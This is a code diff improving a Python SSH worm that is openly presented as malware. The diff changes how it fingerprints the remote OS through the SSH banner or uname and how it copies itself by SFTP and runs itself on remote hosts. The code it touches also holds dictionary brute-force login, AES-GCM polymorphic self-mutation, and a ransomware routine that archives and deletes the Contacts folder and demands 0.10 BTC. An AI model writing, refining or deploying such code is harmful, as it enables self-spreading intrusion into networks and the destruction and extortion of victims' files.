@@ -3,9 +3,9 @@
 This worm does the following:
   - If the file is mutated (i.e. contains the AES‑GCM decryption wrapper),
     it decrypts and executes its worm body.
-  - Otherwise, it scans for new target hosts (via SSH),
-    infects them, and then self‑mutates so that a new unique copy is used
-    for the next propagation cycle.
+  - Otherwise, it scans for new target hosts (via SSH), infects them,
+    and then self‑mutates so that a new unique copy is used for the 
+    next propagation cycle.
 """
 
 import sys, os, base64, uuid, socket, re, subprocess, threading, traceback, logging
@@ -49,7 +49,18 @@ if "# === ENCRYPTED BODY START ===" in head:
 # Worm Body (Propagation Routine)
 #################################
 
-# Logging configuration with a custom colorized formatter
+# Worm configuration constants
+HOME_DIR = os.path.expanduser("~")
+REMOTE_DIR = "Temp"
+INFECTED_LOG = "infected.log"
+USERNAME_DICT = "username.txt"
+PASSWORD_DICT = "password.txt"
+ALLOWED_SUBNETS = ["192.168.0.0/16", "10.0.0.0/16"]
+BLOCKED_SUBNETS = ["127.0.0.0/8", "169.254.0.0/16", "172.16.0.0/20", "224.0.0.0/4"]
+MIN_SUBNET_MASK = 24
+#propagation_threads = []
+
+# Logging configuration with colorized formatter
 class ColorizedFormatter(logging.Formatter):
     grey = "\x1b[38;21m"
     yellow = "\x1b[33;21m"
@@ -75,22 +86,11 @@ console_handler.setLevel(logging.INFO)
 console_handler.setFormatter(ColorizedFormatter())
 logger.addHandler(console_handler)
 
-file_handler = logging.FileHandler(filename=os.path.join(os.path.expanduser("~"), "dmsg.log"))
+file_handler = logging.FileHandler(filename=os.path.join(HOME_DIR, "dmsg.log"))
 file_handler.setLevel(logging.DEBUG)
 file_formatter = logging.Formatter('%(asctime)s - %(message)s')
 file_handler.setFormatter(file_formatter)
 logger.addHandler(file_handler)
-
-# Worm configuration constants
-HOME_DIR = os.path.expanduser("~")
-REMOTE_DIR = "Temp"
-INFECTED_LOG = "infected.log"
-USERNAME_DICT = "username.txt"
-PASSWORD_DICT = "password.txt"
-ALLOWED_SUBNETS = ["192.168.0.0/16", "10.0.0.0/16"]
-BLOCKED_SUBNETS = ["127.0.0.0/8", "169.254.0.0/16", "172.16.0.0/20", "224.0.0.0/4"]
-MIN_SUBNET_MASK = 24
-propagation_threads = []
 
 ########################################
 # Polymorphic Engine (AES-GCM Functions)
@@ -157,38 +157,61 @@ def polymorph_file(file_path):
     logger.error(f"Worm file mutated to {new_name}")
     return new_name
 
-###############################################
-# New Helper Functions for OS-Aware Propagation
-###############################################
+###########################################
+# Helper Functions for OS-Aware Propagation
+###########################################
+
+def passive_remote_os(ssh):
+    """
+    Passively determines the remote OS by looking at the SSH banner
+    (remote version string) from the SSH transport.
+    Avoids executing remote commands.
+    """
+    try:
+        banner = ssh.get_transport().remote_version
+        logger.debug(f"Remote SSH banner: {banner}")
+        if "OpenSSH_for_Windows" in banner:
+            return "Windows"
+        elif "OpenSSH" in banner:
+            return "Linux"
+        elif "Dropbear" in banner:
+            return "Linux"
+        else:
+            return "Unknown"
+    except Exception as e:
+        logger.debug(f"Error retrieving remote banner: {e}")
+        return "Unknown"
 
 def detect_remote_os(ssh):
     """
-    Detect the remote operating system.
-    Tries to run 'uname -s' (works on Linux/Mac). If that fails,
-    assumes the target is Windows.
+    Detect the remote operating system. Tries to run 'uname -s'.
+    If that fails, assumes the target is Windows.
     """
-    try:
-        _, stdout, _ = ssh.exec_command("uname -s")
-        remote_os = stdout.read().decode().strip()
-        if remote_os:
-            logger.info(f"Detected remote OS via uname: {remote_os}")
-            if "Linux" in remote_os or "Darwin" in remote_os:
-                return "Linux"
-    except Exception:
-        pass  # If uname fails, assume Windows
-    logger.info("Assuming remote OS is Windows")
-    return "Windows"
+    passive_fingerprint = passive_remote_os(ssh)
+    if passive_fingerprint == "Unknown":
+        try:
+            _, stdout, _ = ssh.exec_command("uname -s")
+            active_fingerprint = stdout.read().decode().strip()
+            if active_fingerprint:
+                logger.info(f"Detected remote OS via uname: {active_fingerprint}")
+                if "Linux" in active_fingerprint or "Darwin" in active_fingerprint:
+                    return "Linux"
+        except Exception:
+            pass  # 'uname -a' failed -> Windows
+        logger.info("Assuming remote OS is Windows")
+        return "Windows"
+    else:
+        logger.info(f"Detected remote OS via SSH banner: {passive_fingerprint}")
+        return passive_fingerprint
 
-def get_remote_home_dir(ssh):
-    """
-    Returns the home directory based on remote OS.
-    """
-    remote_os = detect_remote_os(ssh)
+def get_remote_home_dir(ssh, remote_os=None):
+    """Returns the home directory on the remote host based on its OS."""
+    if remote_os is None:
+        remote_os = detect_remote_os(ssh)
     try:
         if remote_os == "Linux":
             _, stdout, _ = ssh.exec_command("echo $HOME")
         else:
-            # For Windows, execute the command to echo the USERPROFILE variable.
             _, stdout, _ = ssh.exec_command("echo %USERPROFILE%")
         home_dir = stdout.read().decode().strip()
         if home_dir:
@@ -197,32 +220,28 @@ def get_remote_home_dir(ssh):
             raise ValueError("Empty home directory returned")
     except Exception as e:
         logger.error(f"Error retrieving remote home directory: {e}")
-        # Fallback: for Linux use "~" (note this may not work with all SFTP clients)
         return "~" if remote_os == "Linux" else "%USERPROFILE%"
 
-def remote_path_join(ssh, *parts):
+def remote_path_join(ssh, remote_os, *parts):
     """
     Joins parts of a path using the appropriate separator for the remote OS.
-    It determines the remote OS via detect_remote_os(ssh) and then uses
-    '/' for Linux and '\\' for Windows.
+    Use '/' for Linux and '\\' for Windows.
     """
-    remote_os = detect_remote_os(ssh)
     if remote_os == "Linux":
         return "/".join(parts)
     else:
         return "\\".join(parts)
-    
-def get_remote_exec_command(ssh, mutated_file):
+
+def get_remote_exec_command(ssh, mutated_file, remote_os=None):
     """
     Constructs the remote execution command for the mutated worm file
     based on the remote operating system.
     """
-    remote_os = detect_remote_os(ssh)
+    if remote_os is None:
+        remote_os = detect_remote_os(ssh)
     if remote_os == "Linux":
-        # Use bash syntax (assumes python3 is installed)
         cmd = f"cd ~/{REMOTE_DIR} && python3 {mutated_file}"
     else:  # Windows
-        # Use Windows command prompt syntax; /d allows changing drive letters
         cmd = f'cd /d "%USERPROFILE%\\{REMOTE_DIR}" && python {mutated_file}'
     return cmd
 
@@ -303,10 +322,9 @@ def deploy_ransomware():
             logger.info("Contacts directory not found. Skipping.")
             return
 
-        zip_path = os.path.join(HOME_DIR, "Contacts.zip")
+        zip_path = os.path.join(HOME_DIR, "Contacts.tar")
         try:
-            subprocess.check_call(["powershell", "-Command",
-                                   f"Compress-Archive -Path '{docs_dir}' -DestinationPath '{zip_path}'"])
+            subprocess.check_call(["tar", "-cf", zip_path, docs_dir])
             subprocess.check_call(["rmdir", "/S", "/Q", docs_dir], shell=True)
             with open(note_path, "w") as f:
                 f.write("Your files are now mine. Send 0.10 BTC to my wallet to get them back.\n")
@@ -489,7 +507,9 @@ def connect_via_ssh(ip):
                             timeout=3, auth_timeout=3, banner_timeout=3,
                             allow_agent=False, look_for_keys=False)
                 logger.error(f"SSH login succeeded on {ip} with {user}:{passwd}")
-                spread(ssh)
+                
+                remote_os = detect_remote_os(ssh)    # Determine host OS only once after successful connection
+                spread(ssh, remote_os)
                 sys.exit(0)
                 #return
             except (AuthenticationException, BadHostKeyException):
@@ -500,12 +520,12 @@ def connect_via_ssh(ip):
                 logger.info(f"SSH connection error on {ip}: {str(e)}")
                 return
 
-def spread(ssh):
+def spread(ssh, remote_os):
     """
     If the target is not already infected, mutate the worm,
     transfer it via SSH, and execute it remotely.
     """
-    if check_remote_infection_marker(ssh):
+    if check_remote_infection_marker(ssh, remote_os):
         logger.error("Remote host already infected. Skipping infection...")
         return
     
@@ -514,26 +534,22 @@ def spread(ssh):
     
     logger.error(f"Transferring mutated worm {mutated_file} via SSH...")
     sftp = ssh.open_sftp()
-    remote_home_dir = get_remote_home_dir(ssh)
+    remote_home_dir = get_remote_home_dir(ssh, remote_os)
     try:
-        sftp.mkdir(remote_path_join(ssh, remote_home_dir, REMOTE_DIR))
+        sftp.mkdir(remote_path_join(ssh, remote_os, remote_home_dir, REMOTE_DIR))
     except IOError:
         pass
     base_dir = os.getcwd()
     for filename in os.listdir(base_dir):
         full_path = os.path.join(base_dir, filename)
-        remote_path = remote_path_join(ssh, remote_home_dir, REMOTE_DIR, filename)
+        remote_path = remote_path_join(ssh, remote_os, remote_home_dir, REMOTE_DIR, filename)
         if os.path.isfile(full_path):
             sftp.put(full_path, remote_path)
         else:
-            try:
-                sftp.mkdir(remote_path)
-            except IOError:
-                pass
-            sftp.put_dir(full_path, remote_path)
+            logger.info('Error transferring file: ' + filename)
     sftp.close()
 
-    remote_cmd = get_remote_exec_command(ssh, mutated_file)
+    remote_cmd = get_remote_exec_command(ssh, mutated_file, remote_os)
     logger.error("Remote worm deployed. Executing worm via SSH...")
     t = threading.Thread(target=exec_remote_command, args=(ssh, remote_cmd))
     t.start()
@@ -556,11 +572,11 @@ def self_mutate():
         handler.flush()
     os.execv(mutated_file_path, sys.argv)
 
-def check_remote_infection_marker(ssh):
+def check_remote_infection_marker(ssh, remote_os=None):
     """Check if the target machine already has the worm installed."""
     sftp = ssh.open_sftp()
     try:
-        sftp.chdir(remote_path_join(ssh, get_remote_home_dir(ssh), REMOTE_DIR))
+        sftp.chdir(remote_path_join(ssh, remote_os, get_remote_home_dir(ssh, remote_os), REMOTE_DIR))
     except IOError:
         return False
     sftp.close()
